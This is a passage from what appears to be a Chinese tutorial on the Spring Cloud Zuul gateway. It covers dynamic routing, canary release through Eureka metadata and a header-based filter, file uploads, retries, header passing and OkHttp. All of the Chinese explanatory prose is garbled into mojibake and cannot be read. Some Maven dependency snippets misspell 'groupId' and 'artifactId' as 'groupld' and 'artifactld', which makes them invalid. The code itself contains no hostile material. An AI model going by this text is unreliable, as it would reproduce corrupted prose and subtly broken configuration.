new LinkedHashMap&lt;&gt;(); routesMap.forEach((key, value) -&gt; { String path = key; if (!path.startsWith("/")) { path = "/" + path; } if (StringUtils.hasText(this.properties.getPrefix())) { path = this.properties.getPrefix() + path; if (!path.startsWith("/")) { path = "/" + path; } } values.put(path, value); }); return values; }} åœ¨ zuul-server ç¼–å†™é…ç½®ç±»ï¼Œè®©ä¸Šé¢çš„è‡ªå®šä¹‰è·¯ç”±é…ç½®åŠ è½½å™¨ç”Ÿæ•ˆï¼š 123456789101112131415@Configurationpublic class DynamicZuulConfig { @Autowired private ZuulProperties zuulProperties; @Autowired private ServerProperties serverProperties; @Bean public DynamicZuulRouteLocator routeLocator() { DynamicZuulRouteLocator routeLocator = new DynamicZuulRouteLocator(serverProperties.getServlet().getServletPrefix(), zuulProperties); return routeLocator; }} æµ‹è¯•æ•ˆæœï¼š ä¾æ¬¡å¯åŠ¨ eureka-serverã€provider-serviceã€zuul-server åº”ç”¨ è®¿é—® http://127.0.0.1:8092/provider/service/provider/add?b=3ï¼ŒæŸ¥çœ‹æ¥å£è°ƒç”¨çš„ç»“æœ è®¿é—® http://127.0.0.1:8092/provider-service/provider/add?b=3ï¼ŒæŸ¥çœ‹æ¥å£è°ƒç”¨çš„ç»“æœ è®¿é—® http://127.0.0.1:8092/baiduï¼ŒæŸ¥çœ‹æ˜¯å¦è·³è½¬åˆ°ç™¾åº¦çš„é¦–é¡µ Zuul ç°åº¦å‘å¸ƒç°åº¦å‘å¸ƒæ¦‚è¿°ç°åº¦å‘å¸ƒï¼Œæ˜¯æŒ‡åœ¨ç³»ç»Ÿè¿­ä»£æ–°åŠŸèƒ½æ—¶çš„ä¸€ç§å¹³æ»‘è¿‡æ¸¡çš„ä¸Šçº¿å‘å¸ƒæ–¹å¼ã€‚ç°åº¦å‘å¸ƒæ˜¯åœ¨åŸæœ‰ç³»ç»Ÿçš„åŸºç¡€ä¸Šï¼Œé¢å¤–å¢åŠ ä¸€ä¸ªæ–°ç‰ˆæœ¬ï¼Œè¿™ä¸ªæ–°ç‰ˆæœ¬åŒ…å«éœ€è¦å¾…éªŒè¯çš„æ–°åŠŸèƒ½ï¼Œéšåç”¨è´Ÿè½½å‡è¡¡å™¨å¼•å…¥ä¸€å°éƒ¨åˆ†æµé‡åˆ°è¿™ä¸ªæ–°ç‰ˆæœ¬åº”ç”¨ï¼Œå¦‚æœæ•´ä¸ªè¿‡ç¨‹æ²¡æœ‰å‡ºç°ä»»ä½•å·®é”™ï¼Œå†å¹³æ»‘åœ°æŠŠçº¿ä¸Šç³»ç»Ÿæˆ–æœåŠ¡ä¸€æ­¥æ­¥æ›¿æ¢æˆæ–°ç‰ˆæœ¬ï¼Œè‡³æ­¤å®Œæˆäº†ä¸€æ¬¡ç°åº¦å‘å¸ƒã€‚è¿™ç§å‘å¸ƒæ–¹å¼ç”±äºå¯ä»¥åœ¨ç”¨æˆ·æ— æ„ŸçŸ¥çš„æƒ…å†µä¸‹å®Œæˆäº§å“çš„å‡çº§ï¼Œåœ¨è®¸å¤šå…¬å¸éƒ½æœ‰è¾ƒä¸ºæˆç†Ÿçš„è§£å†³æ–¹æ¡ˆã€‚å¯¹äº Spring Cloud å¾®æœåŠ¡ç”Ÿæ€æ¥è¯´ï¼Œç²’åº¦ä¸€èˆ¬æ˜¯ä¸€ä¸ªæœåŠ¡ï¼Œå¾€å¾€é€šè¿‡ä½¿ç”¨æŸäº›å¸¦æœ‰ç‰¹å®šæ ‡è®°çš„æµé‡æ¥å……å½“ç°åº¦å‘å¸ƒè¿‡ç¨‹ä¸­çš„ â€œå°ç™½é¼ â€ï¼Œå¹¶ä¸”ç›®å‰å·²ç»æœ‰æ¯”è¾ƒå¥½çš„å¼€æºé¡¹ç›®æ¥åšè¿™ä¸ªäº‹æƒ…ã€‚ ç°åº¦å‘å¸ƒå®æˆ˜ç°åº¦å‘å¸ƒæœ‰å¾ˆå¤šç§å®ç°æ–¹å¼ï¼Œè¿™é‡Œè¦è®²çš„æ˜¯åŸºäº Eureka å…ƒæ•°æ®ï¼ˆmetadataï¼‰çš„ä¸€ç§æ–¹å¼ï¼Œå®ƒçš„åŸç†æ˜¯é€šè¿‡è·å– Eureka å®ä¾‹ä¿¡æ¯ï¼Œå¹¶é‰´åˆ«å…ƒæ•°æ®çš„å«ä¹‰ï¼Œå†åˆ†åˆ«è¿›è¡Œè·¯ç”±è§„åˆ™ä¸‹çš„è´Ÿè½½å‡è¡¡ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„ç¤ºä¾‹ä»£ç ã€‚ å…¶ä¸­åœ¨ Eureka é‡Œé¢ï¼Œä¸€å…±æœ‰ä¸¤ç§å…ƒæ•°æ®ï¼š æ ‡å‡†å…ƒæ•°æ®ï¼šè¿™ç§å…ƒæ•°æ®æ˜¯æœåŠ¡çš„å„ç§æ³¨å†Œä¿¡æ¯ï¼Œæ¯”å¦‚ IPã€ç«¯å£ã€æœåŠ¡å¥åº·ä¿¡æ¯ã€ç»­çº¦ä¿¡æ¯ç­‰ï¼Œå­˜å‚¨äºä¸“é—¨ä¸ºæœåŠ¡å¼€è¾Ÿçš„æ³¨å†Œè¡¨ä¸­ï¼Œç”¨äºå…¶ä»–ç»„ä»¶å–ç”¨ä»¥å®ç°æ•´ä¸ªå¾®æœåŠ¡ç”Ÿæ€ è‡ªå®šä¹‰å…ƒæ•°æ®ï¼šè‡ªå®šä¹‰å…ƒæ•°æ®æ˜¯ä½¿ç”¨ eureka.instance.metadata-map.&lt;key&gt;=&lt;value&gt; æ¥é…ç½®çš„ï¼Œå…¶å†…éƒ¨å…¶å®å°±æ˜¯ç»´æŠ¤äº†ä¸€ä¸ª Map æ¥ä¿å­˜è‡ªå®šä¹‰å…ƒæ•°æ®ä¿¡æ¯ï¼Œå¯ä»¥é…ç½®åœ¨æœåŠ¡æä¾›è€…ç«¯ï¼ŒéšæœåŠ¡ä¸€å¹¶æ³¨å†Œä¿å­˜åœ¨ Eureka çš„æ³¨å†Œè¡¨ä¸­ï¼Œå¯¹å¾®æœåŠ¡ç”Ÿæ€çš„ä»»ä½•è¡Œä¸ºéƒ½æ²¡æœ‰å½±å“ï¼Œé™¤éçŸ¥é“å…¶ç‰¹å®šçš„å«ä¹‰ é¦–å…ˆç¼–å†™ provider-serviceã€provider-service-2ã€provider-service-3 åº”ç”¨ï¼Œ9090 ä¸ 9091 ç«¯å£è¿è¡Œçš„æ˜¯ç¨³å®šçš„çº¿ä¸ŠæœåŠ¡ï¼Œå°†å®ƒä»¬çš„ host-mark è®¾ç½®æˆ running-hostï¼Œéœ€è¦ä¸Šçº¿çš„ç°åº¦æœåŠ¡çš„ç«¯å£ä¸º 9092ï¼Œhost-mark ä¸º gray-hostï¼Œæœ€åè¦è¾¾æˆçš„æ•ˆæœæ˜¯ï¼šç”±äºæœåŠ¡åç§°éƒ½ä¸º provider-serviceï¼Œä½†æ˜¯åœ¨æŸä¸€ä¸ªå€¼çš„ä½œç”¨ä¸‹ï¼Œéƒ¨åˆ†è¯·æ±‚è¢«åˆ†å‘åˆ° 9090 ä¸ 9091 å®ä¾‹ä¸Šï¼Œä¹Ÿå°±æ˜¯ host-mark ä¸º running-host çš„èŠ‚ç‚¹ï¼›å¦ä¸€éƒ¨åˆ†åˆ™åˆ†å‘åˆ° 9092 å®ä¾‹ï¼Œhost-mark ä¸º gray-host çš„èŠ‚ç‚¹ã€‚ provider-service çš„ application.yml æ–‡ä»¶ï¼š 123456789101112131415server: port: 9090spring: application: name: provider-serviceeureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: true metadata-map: host-mark: running-host provider-service-2 çš„ application.yml æ–‡ä»¶ï¼š 123456789101112131415server: port: 9091spring: application: name: provider-serviceeureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: true metadata-map: host-mark: running-host provider-service-3 çš„ application.yml æ–‡ä»¶ï¼š 123456789101112131415server: port: 9092spring: application: name: provider-serviceeureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: true metadata-map: host-mark: gray-host åœ¨ zuul-server ä¸­çš„ pom.xml æ–‡ä»¶é‡Œï¼Œå¼•å…¥å¼€æºé¡¹ç›® ribbon-discovery-filter-spring-cloud-starterï¼Œè¯¥é¡¹ç›®æä¾›äº†ä¸€ç§åŸºäº metadata çš„è´Ÿè½½å‡è¡¡æœºåˆ¶ï¼š 12345678910111213&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-zuul&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;io.jmnarloch&lt;/groupId&gt; &lt;artifactId&gt;ribbon-discovery-filter-spring-cloud-starter&lt;/artifactId&gt; &lt;version&gt;2.1.0&lt;/version&gt;&lt;/dependency&gt; åœ¨ zuul-server é‡Œåˆ›å»ºè‡ªå®šä¹‰çš„è¿‡æ»¤å™¨ï¼Œæ­¤è¿‡æ»¤å™¨çš„ä½œç”¨æ˜¯å°† header é‡Œé¢çš„ gray-mark ä½œä¸ºæŒ‡æ ‡ï¼Œå¦‚æœ gray-mark ç­‰äº enable çš„è¯ï¼Œå°±å°†è¯¥è¯·æ±‚è·¯ç”±åˆ°ç°åº¦èŠ‚ç‚¹ gray-hostï¼Œå¦‚æœä¸ç­‰äºæˆ–è€…æ²¡æœ‰è¿™ä¸ªæŒ‡æ ‡å°±è·¯ç”±åˆ°å…¶ä»–èŠ‚ç‚¹ã€‚RibbonFilterContextHolder æ˜¯è¯¥é¡¹ç›®çš„ä¸€ä¸ªæ ¸å¿ƒç±»ï¼Œå®ƒå®šä¹‰äº†åŸºäº metadata çš„ä¸€ç§è´Ÿè½½å‡è¡¡æœºåˆ¶ 123456789101112131415161718192021222324252627282930public class GrayPublishFilter extends ZuulFilter { @Override public String filterType() { return PRE_TYPE; } @Override public int filterOrder() { return PRE_DECORATION_FILTER_ORDER - 1; } @Override public boolean shouldFilter() { RequestContext ctx = RequestContext.getCurrentContext(); return !ctx.containsKey(FORWARD_TO_KEY) &amp;&amp; !ctx.containsKey(SERVICE_ID_KEY); } @Override public Object run() throws ZuulException { HttpServletRequest request = RequestContext.getCurrentContext().getRequest(); String mark = request.getHeader("gray-mark"); if (!StringUtils.isEmpty(mark) &amp;&amp; "enable".equals(mark)) { RibbonFilterContextHolder.getCurrentContext().add("host-mark", "gray-host"); } else { RibbonFilterContextHolder.getCurrentContext().add("host-mark", "running-host"); } return null; }} åœ¨ zuul-server é‡Œåˆ›å»ºé…ç½®ç±»ï¼š 12345678@Configurationpublic class CommonConfiguration { @Bean public GrayPublishFilter grayPublishFilter() { return new GrayPublishFilter(); }} åœ¨ zuul-server é‡Œåˆ›å»ºå¯åŠ¨ä¸»ç±»ï¼š 123456789@EnableZuulProxy@EnableDiscoveryClient@SpringBootApplicationpublic class ZuulServerApplication { public static void main(String[] args) { SpringApplication.run(ZuulServerApplication.class, args); }} æµ‹è¯•æ•ˆæœï¼š ä¾æ¬¡å¯åŠ¨ eureka-serverã€provider-serviceã€provider-service-2ã€provider-service-3ã€zuul-server åº”ç”¨ header ä¸åŠ  gray-mark=enableï¼Œè®¿é—® http://127.0.0.1:8092/provider/service/provider/add?b=3ï¼Œè¯·æ±‚åªä¼šè·¯ç”±åˆ° 9090 ä¸ 9091 ç«¯å£çš„ provider-service æœåŠ¡ä¸Šï¼ˆé»˜è®¤è½®è¯¢ï¼‰ header åŠ ä¸Š gray-mark=enableï¼Œè®¿é—® http://127.0.0.1:8092/provider/service/provider/add?b=3ï¼Œæ— è®ºè¯·æ±‚å¤šå°‘æ¬¡ï¼Œè¯·æ±‚éƒ½ä¼šè·¯ç”±åˆ° 9092 ç«¯å£çš„ provider-service æœåŠ¡ä¸Š Zuul æ–‡ä»¶ä¸Šä¼ æ–‡ä»¶ä¸Šä¼ çš„åœºæ™¯ï¼Œå¾ˆå¤šå¼€å‘è€…éƒ½ä¼šé‡åˆ°ï¼ŒZuul ä½œä¸ºä¸€ä¸ªç½‘å…³ä¸­é—´ä»¶ï¼Œè‡ªç„¶ä¹Ÿä¼šé¢ä¸´æ–‡ä»¶ä¸Šä¼ çš„è€ƒéªŒã€‚Zuul çš„æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½æ˜¯ä» Spring Boot æ‰¿è¢­è¿‡æ¥çš„ï¼Œæ‰€ä»¥ä¹Ÿéœ€è¦ Spring Boot çš„ç›¸å…³é…ç½®ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„ç¤ºä¾‹ä»£ç ã€‚ æ–‡ä»¶ä¸Šä¼ å®æˆ˜zuul-server çš„ pom.xml æ–‡ä»¶ï¼Œä¸ºäº†ä¸Šä¼ æµ‹è¯•æ–¹ä¾¿ï¼Œå¦å¤–å¼•å…¥äº† Swagger2ï¼š 123456789101112131415161718&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-zuul&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt;&lt;/dependency&gt; zuul-server çš„ application.yml æ–‡ä»¶ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940server: port: 8092spring: application: name: zuul-server servlet: multipart: enabled: true #ä½¿ç”¨http multipartä¸Šä¼ å¤„ç† max-file-size: 100MB #è®¾ç½®å•ä¸ªæ–‡ä»¶çš„æœ€å¤§é•¿åº¦ï¼Œé»˜è®¤1Mï¼Œå¦‚ä¸é™åˆ¶é…ç½®ä¸º-1 max-request-size: 100MB #è®¾ç½®æœ€å¤§çš„è¯·æ±‚æ–‡ä»¶çš„å¤§å°ï¼Œé»˜è®¤10Mï¼Œå¦‚ä¸é™åˆ¶é…ç½®ä¸º-1 file-size-threshold: 1MB #å½“ä¸Šä¼ æ–‡ä»¶è¾¾åˆ°1MBçš„æ—¶å€™è¿›è¡Œç£ç›˜å†™å…¥ location: /tmp #ä¸Šä¼ çš„ä¸´æ—¶ç›®å½•eureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: truezuul: routes: provider-service: path: /provider/service/** serviceId: provider-service##### è®¾ç½®Ribbonçš„è¶…æ—¶æ—¶é—´ï¼Œå¦‚æœè¦ä¸Šä¼ å¤§æ–‡ä»¶ï¼Œä¸ºé¿å…è¶…æ—¶ï¼Œç¨å¾®è®¾å¤§ä¸€ç‚¹ribbon: ConnectTimeout: 3000 ReadTimeout: 30000##### Hystrixé»˜è®¤è¶…æ—¶æ—¶é—´ä¸º1ç§’ï¼Œå¦‚æœè¦ä¸Šä¼ å¤§æ–‡ä»¶ï¼Œä¸ºé¿å…è¶…æ—¶ï¼Œç¨å¾®è®¾å¤§ä¸€ç‚¹hystrix: command: default: execution: isolation: thread: timeoutInMilliseconds: 30000 åœ¨ zuul-server é‡Œç¼–å†™ Swagger2 çš„é…ç½®ç±»ï¼š 123456789101112131415161718@Configuration@EnableSwagger2public class Swagger2Config { @Bean public Docket createRestApi() { return new Docket(DocumentationType.SWAGGER_2).apiInfo(apiInfo()).select() .apis(RequestHandlerSelectors.basePackage("com.springcloud.study.controller")) .paths(PathSelectors.any()).build(); } private ApiInfo apiInfo() { return new ApiInfoBuilder() .title("Zuulæ–‡ä»¶ä¸Šä¼ ") .description("Zuulæ–‡ä»¶ä¸Šä¼ ") .version("1.0").build(); }} åœ¨ zuul-server é‡Œç¼–å†™æ–‡ä»¶ä¸Šä¼ çš„æµ‹è¯•ç±»ï¼š 12345678910111213141516171819@RestController@Api("Zuulæ–‡ä»¶ä¸Šä¼ ")public class UploadController { public static final String PREFIX_PATH = "/tmp/upload/"; private static final Logger logger = LoggerFactory.getLogger(UploadController.class); @PostMapping("/upload") @ApiOperation("æ–‡ä»¶ä¸Šä¼ æ¥å£") public String upload(@RequestParam(value = "file", required = true) MultipartFile file) throws Exception { logger.info("==&gt; file size: " + file.getSize()); byte[] bytes = file.getBytes(); String filePath = PREFIX_PATH + UUID.randomUUID().toString(); File fileToSave = new File(filePath); FileCopyUtils.copy(bytes, fileToSave); return filePath; }} æµ‹è¯•æ•ˆæœï¼š ä¾æ¬¡å¯åŠ¨ eureka-serverã€zuul-server åº”ç”¨ è®¿é—® http://127.0.0.1:8092/swagger-ui.htmlï¼Œé€‰æ‹©æœ¬åœ°æ–‡ä»¶è¿›è¡Œä¸Šä¼ å³å¯ æ–‡ä»¶ä¸Šä¼ ä¹±ç åœ¨ Spring Cloud Finchley ä¹‹å‰çš„ç‰ˆæœ¬ï¼Œä¸Šä¼ ä¸­æ–‡åçš„æ–‡ä»¶ä¼šå‡ºç°æ–‡ä»¶åä¹±ç çš„æƒ…å†µï¼Œä¸Šä¼ è‹±æ–‡åçš„æ–‡ä»¶åˆ™ä¸ä¼šï¼Œè¿™æ˜¯ç”±äº Zuul å†…éƒ¨é»˜è®¤ä½¿ç”¨äº† Spring MVC æ¥ä¸Šä¼ æ–‡ä»¶ï¼Œè¿™ç§æ–¹å¼å¯¹ä¸­æ–‡å­—ç¬¦çš„å¤„ç†æœ‰ç‚¹ä¸å‹å¥½ã€‚å¦‚æœè¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥æ”¹ä¸ºä½¿ç”¨ Zuul Servlet æ¥ä¸Šä¼ æ–‡ä»¶ï¼Œå½“éœ€è¦ä¸Šä¼ å¤§æ–‡ä»¶çš„æ—¶å€™å°¤éœ€å¦‚æ­¤ï¼Œå› ä¸ºå®ƒè‡ªå¸¦æœ‰ä¸€ä¸ªç¼“å†²åŒºã€‚æ­¤æ—¶åªéœ€è¦åœ¨è¯·æ±‚è·¯å¾„å‰åŠ ä¸Š /zuul å°±å¯ä»¥ä½¿ç”¨ Zuul Servlet äº†ï¼Œä¾‹å¦‚ï¼šhttp://127.0.0.1:8092/zuul/uploadã€‚ Zuul å®ç”¨æŠ€å·§é¥¥é¥¿åŠ è½½Zuul å†…éƒ¨é»˜è®¤ä½¿ç”¨ Ribbon æ¥è°ƒç”¨è¿œç¨‹æœåŠ¡ï¼Œæ‰€ä»¥ç”±äº Ribbon çš„åŸå› ï¼Œåœ¨éƒ¨ç½²å¥½æ‰€æœ‰åº”ç”¨ç»„ä»¶ä¹‹åï¼Œç¬¬ä¸€æ¬¡ç»è¿‡ Zuul çš„è°ƒç”¨å¾€å¾€ä¼šå»æ³¨å†Œä¸­å¿ƒè¯»å–æœåŠ¡æ³¨å†Œè¡¨ï¼Œåˆå§‹åŒ– Ribbon è´Ÿè½½å‡è¡¡ä¿¡æ¯ï¼Œè¿™æ˜¯ä¸€ç§æ‡’åŠ è½½ç­–ç•¥ï¼Œä½†æ˜¯è¿™ä¸ªè¿‡ç¨‹æ˜¯æå…¶è€—æ—¶çš„ï¼Œå°¤å…¶æ˜¯æœåŠ¡è¿‡å¤šçš„æ—¶å€™ã€‚ä¸ºäº†é¿å…è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥åœ¨å¯åŠ¨ Zuul çš„æ—¶å€™å°±é¥¥é¥¿åŠ è½½åº”ç”¨ç¨‹åºä¸Šä¸‹æ–‡ä¿¡æ¯ï¼›å¼€å¯é¥¥é¥¿åŠ è½½åªéœ€æ·»åŠ ä»¥ä¸‹é…ç½®å³å¯ï¼š 1234zuul: ribbon: eager-load: enabled: true è¯·æ±‚ä½“ä¿®æ”¹åœ¨å®¢æˆ·ç«¯å¯¹ Zuul å‘é€ POST è¯·æ±‚ä¹‹åï¼Œç”±äºæŸäº›åŸå› ï¼Œåœ¨è¯·æ±‚åˆ°ä¸‹æ¸¸æœåŠ¡ä¹‹å‰ï¼Œéœ€è¦å¯¹è¯·æ±‚ä½“è¿›è¡Œä¿®æ”¹ï¼Œå¸¸è§çš„æ˜¯å¯¹ formãƒ»data å‚æ•°çš„å¢å‡ï¼Œå¯¹ application/json çš„ä¿®æ”¹ï¼Œå¯¹è¯·æ±‚ä½“åš Uppercase ç­‰ã€‚åœ¨ Zuul ä¸­å¯ä»¥å¾ˆå¥½åœ°è§£å†³è¿™ç§éœ€æ±‚ï¼Œåªéœ€è¦æ–°å¢ä¸€ä¸ª PRE ç±»å‹çš„ Filter å¯¹è¯·æ±‚ä½“è¿›è¡Œä¿®æ”¹ã€‚ç”±äºåœ¨ Zuul ä¸­æœ‰ Filter (FormBodyWrapperFilter) ä¼šå¯¹è¯·æ±‚ä½“åšå°è£…ï¼Œå› æ­¤åœ¨ç¼–å†™æ­¤ Filter çš„æ—¶å€™åº”å½“æŠŠå®ƒçš„æ‰§è¡Œæ¬¡åºæ”¾åœ¨è¯¥ Filter ä¹‹åï¼Œä¸ºäº†ç¨³å¦¥èµ·è§ï¼ŒæŠŠ ModifyRequestEntityFilter çš„æ¬¡åºè®¾ç½®ä¸º PRE ç±»å‹ Filter çš„æœ€åä¸€çº§ã€‚ 12345678910111213141516171819202122232425262728293031323334public class ModifyRequestEntityFilter extends ZuulFilter { @Override public String filterType() { return PRE_TYPE; } @Override public int filterOrder() { return PRE_DECORATION_FILTER_ORDER + 1; } @Override public boolean shouldFilter() { return true; } @Override public Object run() throws ZuulException { RequestContext ctx = RequestContext.getCurrentContext(); HttpServletRequest request = ctx.getRequest(); request.getParameterMap(); Map&lt;String, List&lt;String&gt;&gt; requestQueryParams = ctx.getRequestQueryParams(); if (requestQueryParams == null){ requestQueryParams = new HashMap&lt;&gt;(); } //è¿™é‡Œæ·»åŠ æ–°å¢å‚æ•°çš„valueï¼Œæ³¨æ„ï¼Œåªå–listçš„0ä½ ArrayList&lt;String&gt; arrayList = new ArrayList&lt;&gt;(); arrayList.add("wwww"); requestQueryParams.put("test", arrayList); ctx.setRequestQueryParams(requestQueryParams); return null; }} é‡è¯•æœºåˆ¶åœ¨ Spring Cloud ä¸­æœ‰å¤šç§å‘é€ HTTP è¯·æ±‚çš„æ–¹å¼å¯ä»¥ä¸ Zuul ç»“åˆï¼ŒRestTemplateã€Ribbon æˆ–è€… Feignï¼Œä½†æ˜¯æ— è®ºé€‰æ‹©å“ªç§ï¼Œéƒ½å¯èƒ½å‡ºç°è¯·æ±‚å¤±è´¥çš„æƒ…å†µï¼Œè¿™åœ¨å¤æ‚çš„äº’è”ç½‘ç¯å¢ƒæ˜¯ä¸å¯é¿å…çš„ã€‚Zuul ä½œä¸ºä¸€ä¸ªç½‘å…³ä¸­é—´ä»¶ï¼Œåœ¨å‡ºç°å¶ç„¶è¯·æ±‚å¤±è´¥æ—¶è¿›è¡Œé€‚å½“çš„é‡è¯•æ˜¯ååˆ†å¿…è¦çš„ï¼Œé‡è¯•å¯ä»¥æœ‰æ•ˆåœ°é¿å…ä¸€äº›çªå‘åŸå› å¼•èµ·çš„è¯·æ±‚ä¸¢å¤±ã€‚Zuul ä¸­çš„é‡è¯•æœºåˆ¶æ˜¯é…åˆ Spring Retry ä¸ Ribbon æ¥ä½¿ç”¨çš„ã€‚ åœ¨ pom.xml å¼•å…¥ Spring Retry çš„ä¾èµ–åŒ…ï¼š 1234&lt;dependency&gt; &lt;groupld&gt;org.springframework.retry&lt;/groupld&gt; &lt;artifactld&gt;spring-retry&lt;/artifactld&gt;&lt;/dependency&gt; åœ¨ application.yml é‡Œæ·»åŠ é‡è¯•ç›¸å…³çš„é…ç½®å†…å®¹ï¼š 123456789101112131415161718#Zuulå¼€å¯é‡è¯•ï¼ŒDç‰ˆä¹‹åé»˜è®¤ä¸ºfalseï¼Œéœ€è¦æ‰‹åŠ¨å¼€å¯zuul: retryable: true#Ribbonçš„é‡è¯•æœºåˆ¶é…ç½®ribbon: ConnectTimeout: 3000 ReadTimeout: 60000 MaxAutoRetries: 1 #å¯¹ç¬¬ä¸€æ¬¡è¯·æ±‚çš„æœåŠ¡çš„é‡è¯•æ¬¡æ•° MaxAutoRetriesNextServer: 1 #è¦é‡è¯•çš„ä¸‹ä¸€ä¸ªæœåŠ¡çš„æœ€å¤§æ•°é‡ï¼ˆä¸åŒ…æ‹¬ç¬¬ä¸€ä¸ªæœåŠ¡ï¼‰ OkToRetryOnAllOperations: true#SpringCloudå†…éƒ¨é»˜è®¤å·²å¼€å¯è´Ÿè½½å‡è¡¡é‡è¯•ï¼Œè¿™é‡Œåˆ—å‡ºæ¥è¯´æ˜è¿™ä¸ªå‚æ•°æ¯”è¾ƒé‡è¦spring: cloud: loadbalancer: retry: enabled: true é…ç½®å½“ä¸­çš„ ConnectTimeout ä¸ ReadTimeou æ˜¯å½“ HTTP å®¢æˆ·ç«¯ä½¿ç”¨ Apache HttpClient çš„æ—¶å€™ç”Ÿæ•ˆçš„ï¼Œè¿™ä¸ªè¶…æ—¶æ—¶é—´æœ€ç»ˆä¼šè¢«è®¾ç½®åˆ° Apache HttpClient ä¸­å»ã€‚åœ¨è®¾ç½®çš„æ—¶å€™è¦ç»“åˆ Hystrix çš„è¶…æ—¶æ—¶é—´æ¥ç»¼åˆè€ƒè™‘ï¼Œé’ˆå¯¹ä¸åŒçš„åº”ç”¨åœºæ™¯ï¼Œè®¾ç½®å¤ªå°ä¼šå¯¼è‡´å¾ˆå¤šè¯·æ±‚å¤±è´¥ï¼Œè®¾ç½®å¤ªå¤§ä¼šå¯¼è‡´ç†”æ–­åŠŸèƒ½æ§åˆ¶æ€§å˜å·®ï¼Œæ‰€ä»¥éœ€è¦ç»è¿‡å‹åŠ›æµ‹è¯•å¾—æ¥ã€‚Zuul åŒæ—¶ä¹Ÿæ”¯æŒå¯¹å•ä¸ªæ˜ å°„è§„åˆ™è¿›è¡Œé‡è¯• zuul.routes.&lt;route&gt;.retryable=trueï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨æŸäº›å¯¹å¹‚ç­‰è¦æ±‚æ¯”è¾ƒé«˜çš„ä½¿ç”¨åœºæ™¯ä¸‹ï¼Œè¦æ…ç”¨é‡è¯•æœºåˆ¶ï¼Œå› ä¸ºå¦‚æœæ²¡æœ‰ç›¸å…³å¤„ç†çš„è¯ï¼Œå‡ºç°å¹‚ç­‰é—®é¢˜æ˜¯ååˆ†æœ‰å¯èƒ½çš„ã€‚ Header ä¼ é€’åœ¨ Zuul ä¸­å¯¹è¯·æ±‚åšäº†ä¸€äº›å¤„ç†ï¼Œéœ€è¦æŠŠå¤„ç†ç»“æœå‘ç»™ä¸‹æ¸¸æœåŠ¡ï¼Œä½†æ˜¯åˆä¸èƒ½å½±å“è¯·æ±‚ä½“çš„åŸå§‹ç‰¹æ€§ï¼Œè¿™ä¸ªé—®é¢˜è¯¥æ€ä¹ˆè§£å†³å¥½å‘¢ï¼ŸZuul æä¾›äº†ä¸€ä¸ªé‡è¦çš„ç±» Requestcontextï¼Œé‡Œé¢çš„ addZuulRequestHeader() æ–¹æ³•æ­£å¥½å¯ä»¥ç”¨æ¥è§£å†³æ­¤é—®é¢˜ï¼Œå®˜æ–¹ç§°ä¹‹ä¸º Header çš„ä¼ é€’ã€‚ 123456789101112131415161718192021222324public class HeaderDeliverFilter extends ZuulFilter { @Override public String filterType() { return PRE_TYPE; } @Override public int filterOrder() { return PRE_DECORATION_FILTER_ORDER + 1; } @Override public boolean shouldFilter() { return true; } @Override public Object run() throws ZuulException { RequestContext context = RequestContext.getCurrentContext(); context.addZuulRequestHeader("result", "to next service"); return null; }} ä½¿ç”¨ OkHttp æ›¿æ¢ Apache HttpClientåœ¨ Spring Cloud ä¸­å„ä¸ªç»„ä»¶ä¹‹é—´ä½¿ç”¨çš„é€šä¿¡åè®®éƒ½æ˜¯ HTTPï¼Œè€Œ HTTP å®¢æˆ·ç«¯ä½¿ç”¨çš„æ˜¯ Apache HttpClientï¼Œä½†æ˜¯ç”±äºå…¶éš¾ä»¥æ‰©å±•ç­‰è¯¸å¤šåŸå› ï¼Œå·²è¢«è®¸å¤šæŠ€æœ¯æ ˆå¼ƒç”¨ã€‚ Square å…¬å¸å¼€å‘çš„ okhttp æ­£åœ¨é€æ¸è¢«æ¥å—ï¼Œåœ¨ Zuul ä¸­ä½¿ç”¨ okhttp æ›¿æ¢ Apache HttpClientï¼Œé¦–å…ˆéœ€è¦åœ¨ pom.xml ä¸­å¢åŠ  okhttp çš„ä¾èµ–åŒ…ï¼š 1234&lt;dependency&gt; &lt;groupld&gt;com.squareup.okhttp3&lt;/groupld&gt; &lt;artifactId&gt;okhttp&lt;/artifactId&gt;&lt;/dependency&gt; ç„¶ååœ¨ application.yml æ–‡ä»¶ä¸­ç¦ç”¨ HttpClient å¹¶å¼€å¯ okhttp å³å¯ï¼š 12345ribbon: httpclient: enabled: false okhttp: enabled: true ä¸‹ç¯‡ - Zuul å…¥é—¨æ•™ç¨‹ï¼ˆé«˜çº§ç¯‡ï¼‰ Zuul å…¥é—¨æ•™ç¨‹ - é«˜çº§ç¯‡ var isMobile = 